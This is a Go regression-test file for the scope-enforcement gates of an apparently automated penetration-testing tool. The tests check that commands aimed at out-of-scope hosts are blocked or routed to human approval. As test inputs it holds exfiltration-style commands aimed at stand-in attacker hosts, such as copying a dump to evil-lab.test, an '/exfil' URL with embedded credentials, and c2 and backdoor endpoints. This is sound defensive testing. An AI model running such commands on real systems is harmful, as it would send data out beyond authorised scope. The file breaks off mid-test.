package engine

import (
	"strings"
	"testing"

	"jiutouniao/internal/config"
	"jiutouniao/internal/store"
)

// ---- v7.8.1 授权扩展识别修正回归（诊断实测三处识别错误：回执自反馈/子串误匹配/目标重复）----

// 修正①：治理/人工操作回执不并入发现语料——目标首次被拦留证后，次命中不得被误判
// 「立足点发现」开工单（实测 9.9.9.9 从未被立足点发现，首拦留证后次命中即开单 AP-…）。
func TestV781BlockReceiptNotDiscovered(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-A", Name: "回执自反馈",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	// 模拟 governanceGates 拦截留证：命令原文（含范围外目标）作为 Input 落证据链
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s6", Type: "command",
		Input: "curl -s http://9.9.9.9/", Output: "被治理门拦截：strict_scope=true：命令引用范围外目标 [9.9.9.9]——已确定性拦截。",
		ApprovedBy: "scope-gate"})
	blocked, msg := o.scopeGate(p, "curl -s http://9.9.9.9/")
	if !blocked || !strings.Contains(msg, "已确定性拦截") || strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("拦截回执不得喂发现语料：目标未被立足点发现，应维持硬拦不开工单: blocked=%v msg=%s", blocked, msg)
	}
	if aps, _ := st.ListApprovals(p.ID); len(aps) != 0 {
		t.Fatalf("凭空目标不应生成授权扩展工单: %+v", aps)
	}
	// 人工拒绝回执同理：拒绝过的目标不得翻脸成扩展候选
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s6", Type: "command",
		Input: "curl -s http://8.8.7.7/", Output: "人工拒绝", ApprovedBy: "human-rejected"})
	if blocked2, msg2 := o.scopeGate(p, "curl -s http://8.8.7.7/"); !blocked2 || strings.Contains(msg2, "授权扩展工单") {
		t.Fatalf("人工拒绝回执不得喂发现语料: blocked=%v msg=%s", blocked2, msg2)
	}
	// 正向对照：真实发现证据（ApprovedBy=auto）仍走工单通道，不因回执排除规则误伤
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s5", Type: "command",
		Input: "cat pwned.txt", Output: "fs01=172.33.0.40 nas02 creds", ApprovedBy: "auto"})
	if blocked3, msg3 := o.scopeGate(p, "curl -s http://172.33.0.40/"); !blocked3 || !strings.Contains(msg3, "授权扩展工单") {
		t.Fatalf("真实发现目标应走扩展工单通道: blocked=%v msg=%s", blocked3, msg3)
	}
}

// 修正②：发现匹配边界约束——证据 172.33.0.40 不得验证从未出现的 172.33.0.4；
// sub.evil.com 不得验证 evil.com（纯 Contains 子串误判，实测凭空目标误开工单）。
func TestV781DiscoveredBoundaryMatch(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-B", Name: "边界匹配",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s5", Type: "command",
		Input: "cat pwned.txt", Output: "fs01=172.33.0.40 nas02 creds sub.evil.com", ApprovedBy: "auto"})

	if blocked, msg := o.scopeGate(p, "curl -s http://172.33.0.4/"); !blocked || strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("证据只含 172.33.0.40，172.33.0.4 应维持硬拦不开工单: blocked=%v msg=%s", blocked, msg)
	}
	if blocked, msg := o.scopeGate(p, "curl -s http://evil.com/"); !blocked || strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("证据只含 sub.evil.com，evil.com 应维持硬拦不开工单: blocked=%v msg=%s", blocked, msg)
	}
	// 正向对照：完整出现的 172.33.0.40 仍走工单通道（边界规则不误伤真实发现）
	if blocked, msg := o.scopeGate(p, "curl -s http://172.33.0.40/"); !blocked || !strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("真实发现目标应走扩展工单通道: blocked=%v msg=%s", blocked, msg)
	}
	// 边界匹配器单测表
	cases := []struct {
		hay, needle string
		want        bool
	}{
		{"fs01=172.33.0.40 nas02", "172.33.0.40", true},   // 完整出现
		{"fs01=172.33.0.40 nas02", "172.33.0.4", false},   // 更长 token 吞并（尾随数字）
		{"1172.33.0.4", "172.33.0.4", false},              // 前导数字吞并
		{"sub.evil.com 上线", "evil.com", false},            // 子域前导点吞并
		{"evil.company.com 上线", "evil.com", false},        // 连字符吞并
		{"访问 evil.com 一次", "evil.com", true},              // 词边界命中
		{"http://evil.com:8080/x", "evil.com", true},       // host:port 命中
		{"", "9.9.9.9", false},                             // 空语料
	}
	for _, c := range cases {
		if got := discoveredHitBoundary(c.hay, c.needle); got != c.want {
			t.Fatalf("discoveredHitBoundary(%q,%q)=%v want %v", c.hay, c.needle, got, c.want)
		}
	}
}

// 修正④：hostAllowed 保留原始 host 双形态校验——www.* 形态的授权目标/资产不再被
// 「无条件剥 www. 前缀」击穿：主目标 www.* 自身访问放行、扩展工单批准登记后真实放行。
func TestV781WwwHostAllowedDualForm(t *testing.T) {
	o, st := v48Orchestrator(t)
	// ① 主目标 www.* 自身访问：原实现被判「范围外」硬拦（修正前 blocked=true）
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-D", Name: "www主目标",
		Target: "www.example-lab.test", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	if blocked, msg := o.scopeGate(p, "curl -s https://www.example-lab.test/admin"); blocked {
		t.Fatalf("主目标 www.* 自身访问应放行: msg=%s", msg)
	}
	// ② 授权扩展闭环：范围外 www.* 目标发现 → 工单 → 批准登记 → 真实放行（修正前批准后仍拦）
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s1", Type: "command",
		Input: "子域枚举", Output: "发现后台 www.ops.example-lab.test", ApprovedBy: "auto"})
	blocked, msg := o.scopeGate(p, "curl -s https://www.ops.example-lab.test/")
	if !blocked || !strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("已发现范围外 www.* 目标应走工单通道: blocked=%v msg=%s", blocked, msg)
	}
	aps, _ := st.ListApprovals(p.ID)
	if len(aps) != 1 || aps[0].Target != "www.ops.example-lab.test" {
		t.Fatalf("应生成 1 张 www.ops 工单: %+v", aps)
	}
	if err := o.ApplyScopeExtension(p.ID, "www.ops.example-lab.test"); err != nil {
		t.Fatalf("扩展回调失败: %v", err)
	}
	if blocked2, msg2 := o.scopeGate(p, "curl -s https://www.ops.example-lab.test/"); blocked2 {
		t.Fatalf("扩展批准登记后 www.* 目标应放行（修正前批准不生效）: msg=%s", msg2)
	}
	// ③ fail-closed 对照：只授权 www.* 时裸域仍拦（双形态只放行显式授权形态，无新绕过面）
	if blocked3, msg3 := o.scopeGate(p, "curl -s https://ops.example-lab.test/"); !blocked3 || strings.Contains(msg3, "授权扩展工单") {
		t.Fatalf("未授权裸域 ops（授权仅 www.ops）应维持硬拦: blocked=%v msg=%s", blocked3, msg3)
	}
	// ④ 剥前缀兼容口径回归：授权裸域时 www 子域仍放行（原 v6.1.0 意图不受影响）
	p2 := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-E", Name: "裸域授权",
		Target: "example-lab.test", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p2)
	if blocked4, msg4 := o.scopeGate(p2, "curl -s https://www.example-lab.test/"); blocked4 {
		t.Fatalf("授权裸域时 www 子域应放行（v6.1.0 既有口径）: msg=%s", msg4)
	}
}

// 修正⑤：内联代理旗标 scheme 锚定剥离——`-x/--proxy http(s)://`、`socks5://` 值是传输
// 通道非测试目标（与 v5.7.2 env 赋值形态同口径）；无 scheme 值不剥（宁误拦不漏拦）。
func TestV781ProxyFlagStripped(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-F", Name: "代理旗标",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	blocked, msg := o.scopeGate(p, "curl -x http://proxy.corp:3128 http://9.9.9.9/")
	if !blocked || !strings.Contains(msg, "[9.9.9.9]") || strings.Contains(msg, "proxy.corp") {
		t.Fatalf("内联代理旗标 host 不应计入范围外目标: blocked=%v msg=%s", blocked, msg)
	}
	if blocked2, msg2 := o.scopeGate(p, "curl --proxy socks5h://10.11.12.13:1080 http://9.9.9.9/"); strings.Contains(msg2, "10.11.12.13") {
		t.Fatalf("socks 代理旗标值不应计入范围外目标: msg=%s", msg2)
	} else if !blocked2 {
		t.Fatalf("真实目标 9.9.9.9 仍应被拦")
	}
	// 无 scheme 代理值维持原状（残余口径：宁误拦不漏拦，-x host:port 仍参与目标校验）
	if blocked3, msg3 := o.scopeGate(p, "curl -x 10.11.12.13:1080 http://9.9.9.9/"); !blocked3 || !strings.Contains(msg3, "10.11.12.13") {
		t.Fatalf("无 scheme 代理值应维持参与目标校验（不新增漏拦面）: blocked=%v msg=%s", blocked3, msg3)
	}
}

// 补强⑥：括号 IPv6 字面量——urlHostRe 字符类不含 '['，括号 host 形态此前对范围门不可见
//（漏拦面）。提取后以去括号裸形校验/入账；≥2 冒号复核排除 [1:2]/[abc] 代码形态。
func TestV781IPv6LiteralScope(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-G", Name: "IPv6",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	// ① 范围外 IPv6：应被拦（修正前静默直连）且裸形入账
	if blocked, msg := o.scopeGate(p, "curl -s http://[fd00::5]/admin"); !blocked || !strings.Contains(msg, "fd00::5") {
		t.Fatalf("范围外括号 IPv6 应被拦截: blocked=%v msg=%s", blocked, msg)
	}
	// ② 回环 ::1 与 127.0.0.1 同信任级：放行
	if blocked, msg := o.scopeGate(p, "curl -s http://[::1]:8080/health"); blocked {
		t.Fatalf("回环 [::1] 应放行: msg=%s", msg)
	}
	// ③ 代码形态不误报：切片 [1:2]（单冒号）/十六进制词 [abc]（零冒号）不进目标集
	if blocked, msg := o.scopeGate(p, "grep 'arr[1:2]' http://9.9.9.9/"); !blocked || !strings.Contains(msg, "[9.9.9.9]") || strings.Contains(msg, "1:2") {
		t.Fatalf("切片/下标括号不应误入目标集: blocked=%v msg=%s", blocked, msg)
	}
	// ④ 扩展闭环：发现 IPv6 目标 → 工单 → 批准登记 → 真实放行
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s1", Type: "command",
		Input: "内网测绘", Output: "发现内网服务 [fd00::5] 开放 8080", ApprovedBy: "auto"})
	if blocked, msg := o.scopeGate(p, "curl -s http://[fd00::5]/admin"); !blocked || !strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("已发现 IPv6 目标应走工单通道: blocked=%v msg=%s", blocked, msg)
	}
	if err := o.ApplyScopeExtension(p.ID, "fd00::5"); err != nil {
		t.Fatalf("扩展回调失败: %v", err)
	}
	if blocked, _ := o.scopeGate(p, "curl -s http://[fd00::5]/admin"); blocked {
		t.Fatal("扩展批准登记后 IPv6 目标应放行（登记裸形与查询裸形一致）")
	}
	// ⑤ 目标清单写括号形：授权 [fd00::6] 时查询裸/括号两形态均放行
	p2 := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-H", Name: "IPv6括号授权",
		Target: "[fd00::6]", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p2)
	if blocked, _ := o.scopeGate(p2, "curl -s http://[fd00::6]/"); blocked {
		t.Fatal("授权括号形目标应放行括号形查询")
	}
	// ⑥ fail-closed 对照：授权 fd00::6 时 fd00::7 仍拦
	if blocked, msg := o.scopeGate(p2, "curl -s http://[fd00::7]/"); !blocked || strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("范围外 IPv6 应维持硬拦: blocked=%v msg=%s", blocked, msg)
	}
}



// 修正③：范围门目标提取去重——URL 内嵌 IP 不再被 urlHostRe/ipLitRe 双重命中，
// 拦截/工单消息不再出现 [9.9.9.9 9.9.9.9] 形态重复项。
func TestV781ScopeGateNoDuplicateTargets(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-C", Name: "目标去重",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	blocked, msg := o.scopeGate(p, "curl -s http://9.9.9.9/")
	if !blocked || !strings.Contains(msg, "[9.9.9.9]") || strings.Contains(msg, "9.9.9.9 9.9.9.9") {
		t.Fatalf("URL 内嵌 IP 不应重复计入拦截消息: blocked=%v msg=%s", blocked, msg)
	}
}

// 修正⑦：工单目标大小写归一——urlHostRe 捕获原始大小写会击穿工单幂等查重（实测
// EXAMPLE-LAB.test / example-lab.test 开出 2 张工单）；host 大小写不敏感，全链路归一小写。
func TestV781TicketTargetCaseNormalized(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-I", Name: "大小写幂等",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s1", Type: "command",
		Input: "recon", Output: "发现后台 EXAMPLE-LAB.test 内网系统", ApprovedBy: "auto"})
	blocked, msg := o.scopeGate(p, "curl -s http://EXAMPLE-LAB.test/")
	if !blocked || !strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("首次命中应开单: msg=%s", msg)
	}
	aps, _ := st.ListApprovals(p.ID)
	if len(aps) != 1 || aps[0].Target != "example-lab.test" {
		t.Fatalf("工单目标应为归一小写形态: %+v", aps)
	}
	// 同一 host 不同大小写再次命中：复用在批工单，不重复开单
	if blocked2, msg2 := o.scopeGate(p, "curl -s http://example-lab.test/"); !blocked2 || !strings.Contains(msg2, "在批") {
		t.Fatalf("大小写变体应复用在批工单: blocked=%v msg=%s", blocked2, msg2)
	}
	aps2, _ := st.ListApprovals(p.ID)
	if len(aps2) != 1 {
		t.Fatalf("大小写变体不应重复开单: %+v", aps2)
	}
}

// 修正⑧：拒绝粘滞——人工拒绝后，该目标次命中不再重开新单（工单文案承诺「拒绝则该目标
// 维持只记录不访问」），拦截消息给出拒绝话术与人工恢复路径。
func TestV781RejectedTicketSticky(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-J", Name: "拒绝粘滞",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s1", Type: "command",
		Input: "recon", Output: "发现 10.99.0.77 备份服务", ApprovedBy: "auto"})
	if blocked, msg := o.scopeGate(p, "curl -s http://10.99.0.77/"); !blocked || !strings.Contains(msg, "已生成/在批") {
		t.Fatalf("首次命中应开单: msg=%s", msg)
	}
	aps, _ := st.ListApprovals(p.ID)
	if len(aps) != 1 {
		t.Fatalf("应生成 1 张工单: %+v", aps)
	}
	ap, err := st.GetApproval(aps[0].ID)
	if err != nil {
		t.Fatalf("取工单失败: %v", err)
	}
	ap.Status = "rejected" // 与 Approver.Decide 拒绝分支等价的库内状态流转（测试装配 approver 为 nil）
	if err := st.SaveApproval(ap); err != nil {
		t.Fatalf("拒绝工单失败: %v", err)
	}
	// 拒绝后次命中：不开新单，消息给出拒绝话术
	blocked2, msg2 := o.scopeGate(p, "curl -s http://10.99.0.77/")
	if !blocked2 || strings.Contains(msg2, "已生成/在批") || !strings.Contains(msg2, "已被拒绝") {
		t.Fatalf("被拒目标应维持硬拦且不再开单: blocked=%v msg=%s", blocked2, msg2)
	}
	if aps2, _ := st.ListApprovals(p.ID); len(aps2) != 1 {
		t.Fatalf("拒绝粘滞：不应重开新单，工单数仍为 1: %+v", aps2)
	}
}

// 修正⑨：URL host 提取覆盖——scheme 全族(http(s)/ftp(s)/sftp/ssh/scp/telnet/ws/wss/tcp/udp)
// + userinfo 跳过 + 括号 IPv6。原实现 ftp://telnet://wss://ssh:// 全部静默绕过 strict_scope，
// userinfo 被误提取为目标（实测 admin:pw 入 bad）。
func TestV781SchemeFamilyAndUserinfo(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-K", Name: "scheme族",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	// ① 非 http scheme 绕过关闭：均应拦截且 host 正确
	for _, c := range []struct {
		cmd, want string
	}{
		{"curl -s ftp://files.evil-lab.test/pub/", "files.evil-lab.test"},
		{"curl -s telnet://backdoor.evil-lab.test:4444/", "backdoor.evil-lab.test:4444"},
		{"curl -s wss://c2.evil-lab.test/ws", "c2.evil-lab.test"},
		{"git clone ssh://git@9.9.9.9/team/repo.git", "9.9.9.9"},
	} {
		blocked, msg := o.scopeGate(p, c.cmd)
		if !blocked || !strings.Contains(msg, c.want) {
			t.Fatalf("scheme 形态应拦截且提取 host %q: cmd=%q blocked=%v msg=%s", c.want, c.cmd, blocked, msg)
		}
	}
	// ② userinfo 不再误提取：目标只有真实 host，凭据字样不入 bad
	if blocked, msg := o.scopeGate(p, "curl -s http://admin:pw@9.9.9.9/exfil"); !blocked || !strings.Contains(msg, "9.9.9.9") || strings.Contains(msg, "admin:pw") {
		t.Fatalf("userinfo 应跳过、host 应提取: blocked=%v msg=%s", blocked, msg)
	}
	// ③ userinfo-在白名单真绕过关闭：admin 不在白名单,9.9.9.9 仍被拦
	if blocked, msg := o.scopeGate(p, "curl -s http://admin@9.9.9.9/"); !blocked || !strings.Contains(msg, "9.9.9.9") || strings.Contains(msg, "[admin]") {
		t.Fatalf("userinfo 形态应校验真实 host: blocked=%v msg=%s", blocked, msg)
	}
	// ④ 授权目标带 userinfo：放行（host 命中主目标）
	if blocked, msg := o.scopeGate(p, "curl -s http://admin@10.0.0.1/"); blocked {
		t.Fatalf("授权 host 带 userinfo 应放行: msg=%s", msg)
	}
	// ⑤ 白名单源 scheme 形态：github.com 放行（gitSourceLabel 顺带由 git@ 误标修正）
	if blocked, msg := o.scopeGate(p, "git clone ssh://git@github.com/org/repo.git"); blocked {
		t.Fatalf("白名单源 ssh:// 形态应放行: msg=%s", msg)
	}
	if got := gitSourceLabel("ssh://git@github.com/org/repo.git"); got != "github" {
		t.Fatalf("gitSourceLabel 对 userinfo 形态应得 github: %q", got)
	}
	// ⑥ IPv6 URL 带 userinfo：去括号归一后拦截
	if blocked, msg := o.scopeGate(p, "curl -s ssh://admin@[fd00::5]/x"); !blocked || !strings.Contains(msg, "fd00::5") {
		t.Fatalf("IPv6 URL userinfo 形态应拦截: blocked=%v msg=%s", blocked, msg)
	}
	// ⑦ 既有 http 形态回归：主目标放行
	if blocked, _ := o.scopeGate(p, "curl -s http://10.0.0.1/"); blocked {
		t.Fatal("既有 http 形态回归失败")
	}
}

// 补强⑩：ssh/scp/sftp 上下文锚定的裸 user@host 提取——'@' 不入裸域名边界（email 误拦
// 教训），仅 ssh 类命令上下文内提取；实测 ssh admin@host 此前静默放行。
func TestV781SshAtHostContext(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-M", Name: "ssh形态",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	// ① 绕过收口：ssh 裸 user@host 应拦截
	if blocked, msg := o.scopeGate(p, "ssh -oBatchMode=yes admin@evil-lab.test"); !blocked || !strings.Contains(msg, "evil-lab.test") {
		t.Fatalf("ssh 裸 user@host 应拦截: blocked=%v msg=%s", blocked, msg)
	}
	// ② scp 路径形态：host:/path 尾冒号应剥离
	if blocked, msg := o.scopeGate(p, "scp dump.tar admin@evil-lab.test:/tmp/"); !blocked || !strings.Contains(msg, "evil-lab.test") || strings.Contains(msg, "evil-lab.test:") {
		t.Fatalf("scp host:/path 形态应拦且目标不含尾冒号: blocked=%v msg=%s", blocked, msg)
	}
	// ③ IPv6 括号形态
	if blocked, msg := o.scopeGate(p, "ssh admin@[fd00::5]"); !blocked || !strings.Contains(msg, "fd00::5") {
		t.Fatalf("ssh user@[IPv6] 应拦且去括号: blocked=%v msg=%s", blocked, msg)
	}
	// ④ 授权目标放行
	if blocked, _ := o.scopeGate(p, "ssh admin@10.0.0.1"); blocked {
		t.Fatal("授权 host 的 ssh 应放行")
	}
	// ⑤ email 误拦防线：无 ssh 上下文时 @ 形态不提取（既有口径不变）
	if blocked, msg := o.scopeGate(p, "echo contact ops-admin@evil-lab.test for keys"); blocked {
		t.Fatalf("非 ssh 命令的 email 形态不得误判为网络目标: msg=%s", msg)
	}
	// ⑥ 归一口径：normalizeS1Host 括号感知（⑨配套）
	if got := normalizeS1Host("[FD00::5]:8080"); got != "fd00::5" {
		t.Fatalf("normalizeS1Host 括号 IPv6+端口应归一为裸形: %q", got)
	}
	if got := normalizeS1Host("Example.COM:443"); got != "example.com" {
		t.Fatalf("normalizeS1Host 既有去端口口径应保持: %q", got)
	}
	if got := normalizeS1Host("fd00::5"); got != "fd00::5" {
		t.Fatalf("normalizeS1Host 裸 IPv6 既有行为应保持: %q", got)
	}
}

// 覆盖缺口补测：expansion=auto 档此前无 scopeGate 直测——已发现目标直接放行留痕、
// 混合命令给出拆分话术、全程不开工单。
func TestV781ExpansionAutoMode(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-N", Name: "auto档",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	o.roe = &ROEProfile{Values: map[string]string{"expansion": "auto"}}
	defer func() { o.roe = nil }()
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s1", Type: "command",
		Input: "recon", Output: "发现内网 172.33.0.40 文件服务", ApprovedBy: "auto"})
	// ① 全部目标已发现：放行
	if blocked, msg := o.scopeGate(p, "curl -s http://172.33.0.40/"); blocked {
		t.Fatalf("auto 档已发现目标应放行: msg=%s", msg)
	}
	// ② 混合：已发现+未发现 → 拦截并给出拆分话术
	blocked, msg := o.scopeGate(p, "curl -s http://172.33.0.40/ http://9.9.9.9/")
	if !blocked || !strings.Contains(msg, "expansion=auto 放行") || !strings.Contains(msg, "9.9.9.9") || !strings.Contains(msg, "172.33.0.40") {
		t.Fatalf("auto 档混合命令应拦截并给出拆分话术: blocked=%v msg=%s", blocked, msg)
	}
	// ③ auto 档不开工单（放行即留痕，不走审批）
	if aps, _ := st.ListApprovals(p.ID); len(aps) != 0 {
		t.Fatalf("auto 档不应生成工单: %+v", aps)
	}
}

// 补强⑪：scheme 集补全 DB/同步协议族——postgres(ql)/mysql/mariadb/mongodb(+srv)/redis(s)/
// mssql/ldap(s)/git/svn/rsync 连接串此前对 strict_scope 静默放行（IP 形态靠 ipLitRe 侥幸）。
func TestV781DbAndSyncSchemes(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-O", Name: "DB协议",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	for _, c := range []struct {
		cmd, want string
	}{
		{"psql 'postgres://admin:pw@files.evil-lab.test:5432/secret'", "files.evil-lab.test:5432"},
		{"mongo 'mongodb+srv://c2.evil-lab.test/db'", "c2.evil-lab.test"},
		{"git clone git://files.evil-lab.test/x.git", "files.evil-lab.test"},
		{"rsync -a rsync://mirror.evil-lab.test/mod/", "mirror.evil-lab.test"},
	} {
		blocked, msg := o.scopeGate(p, c.cmd)
		if !blocked || !strings.Contains(msg, c.want) || strings.Contains(msg, "admin:pw") {
			t.Fatalf("DB/同步协议连接串应拦截且提取 host %q: cmd=%q blocked=%v msg=%s", c.want, c.cmd, blocked, msg)
		}
	}
	// 授权目标连接串放行
	if blocked, _ := o.scopeGate(p, "psql 'postgresql://admin@10.0.0.1/db'"); blocked {
		t.Fatal("授权 host 的 postgres 连接串应放行")
	}
}

// 补强⑫：批量清单行 user@host 收口——run_batch targets/`-l` 清单行是「声明的目标」，
// 行内 admin@host 的 host 部分直接参与范围校验（实测此前静默通过）。
func TestV781BatchListAtHost(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-P", Name: "清单行",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	if v := o.singleTargetScopeViolations(p, "admin@evil-lab.test"); v == "" || !strings.Contains(v, "范围门") {
		t.Fatalf("清单行 user@host 应过范围门: %q", v)
	}
	if v := o.singleTargetScopeViolations(p, "admin@evil-lab.test:/tmp/dump"); v == "" || !strings.Contains(v, "范围门") {
		t.Fatalf("清单行 scp 路径形态应过范围门: %q", v)
	}
	if v := o.singleTargetScopeViolations(p, "admin@10.0.0.1"); v != "" {
		t.Fatalf("授权 host 清单行应放行: %q", v)
	}
	if v := o.singleTargetScopeViolations(p, "10.0.0.1"); v != "" {
		t.Fatalf("既有裸目标行口径应保持放行: %q", v)
	}
}

// 补强⑬：影子资产门与范围门对同一命令形态同口径——影子资产经 ssh user@host / 清单行
// @-form 访问时由影子门拦截（scope_status 标注语义），不得降级为范围门消息。
func TestV781ShadowGateAtFormConsistency(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-Q", Name: "影子一致",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true}
	_ = st.SaveProject(p)
	_, _ = st.AddAsset(&store.Asset{ProjectID: p.ID, Stage: "s2", Type: "domain", Value: "shadow-lab.test",
		ScopeStatus: "shadow_pending", Detail: "S1 影子资产"})
	// ① ssh 裸 user@host 访问影子资产：影子门拦截（⑬ 前漏检，降级为范围门）
	blocked := o.assetTestBlockedAssets(p, "ssh -oBatchMode=yes admin@shadow-lab.test")
	if len(blocked) == 0 || !strings.Contains(blocked[0], "shadow-lab.test") {
		t.Fatalf("影子门应拦截 ssh user@shadow 资产: %v", blocked)
	}
	// ② 清单行 @-form：影子门先行
	if v := o.singleTargetScopeViolations(p, "admin@shadow-lab.test"); !strings.Contains(v, "影子资产门") {
		t.Fatalf("清单行 @-form 应由影子门拦截: %q", v)
	}
	// ③ 非 @ 形态既有口径不变
	if blocked2 := o.assetTestBlockedAssets(p, "curl -s http://shadow-lab.test/"); len(blocked2) == 0 {
		t.Fatal("既有 URL 形态影子拦截应保持")
	}
	// ④ in_scope 资产不受影子门影响
	_, _ = st.AddAsset(&store.Asset{ProjectID: p.ID, Stage: "s2", Type: "domain", Value: "ok-lab.test",
		ScopeStatus: "in_scope", ScopeEvidence: "授权文书", Detail: "在册资产"})
	if blocked3 := o.assetTestBlockedAssets(p, "ssh ops@ok-lab.test"); len(blocked3) != 0 {
		t.Fatalf("in_scope 资产 ssh 访问不应被影子门拦截: %v", blocked3)
	}
}

// 端到端集成验证：完整治理链（授权门→影子门→范围门→工单→批准/拒绝）首次以 Authorized
// 项目整体驱动——此前各修复单测均直测 scopeGate，链路组合与回执卫生从未整体验证。
func TestV781GovernanceE2E(t *testing.T) {
	o, st := v48Orchestrator(t)
	p := &store.Project{ROEAcknowledgedAt: "2026-11-22T00:00:00Z", ID: "P-V781-R", Name: "端到端",
		Target: "10.0.0.1", ExecutionProfile: "isolated_lab", StrictScope: true, Authorized: true}
	_ = st.SaveProject(p)

	// ① 在册目标命令：全链放行
	if msg := o.governanceGates(p, "s6", "curl -s http://10.0.0.1/health", "run_command", false); msg != "" {
		t.Fatalf("在册目标应全链放行: %s", msg)
	}

	// ② 未发现范围外目标：硬拦留证；重试仍硬拦不开工单（修正①端到端形态）
	if msg := o.governanceGates(p, "s6", "curl -s http://9.9.9.9/", "run_command", false); msg == "" || !strings.Contains(msg, "已确定性拦截") {
		t.Fatalf("未发现目标应硬拦: %s", msg)
	}
	if msg := o.governanceGates(p, "s6", "curl -s http://9.9.9.9/", "run_command", false); !strings.Contains(msg, "已确定性拦截") || strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("拦截留证后重试不得误开工单: %s", msg)
	}

	// ③ 已发现范围外目标：工单 + 批准登记 → 全链放行
	_, _ = st.AddEvidence(&store.EvidenceRecord{ProjectID: p.ID, Stage: "s5", Type: "command",
		Input: "cat pwned.txt", Output: "fs01=172.33.0.40 nas02", ApprovedBy: "auto"})
	if msg := o.governanceGates(p, "s6", "curl -s http://172.33.0.40/", "run_command", false); !strings.Contains(msg, "授权扩展工单") {
		t.Fatalf("已发现目标应开工单: %s", msg)
	}
	aps, _ := st.ListApprovals(p.ID)
	if len(aps) != 1 || aps[0].Kind != "scope_extension" || aps[0].Target != "172.33.0.40" {
		t.Fatalf("应生成 1 张目标正确的工单: %+v", aps)
	}
	if err := o.ApplyScopeExtension(p.ID, "172.33.0.40"); err != nil {
		t.Fatalf("批准回调失败: %v", err)
	}
	if msg := o.governanceGates(p, "s6", "curl -s http://172.33.0.40/", "run_command", false); msg != "" {
		t.Fatalf("批准后应全链放行: %s", msg)
	}

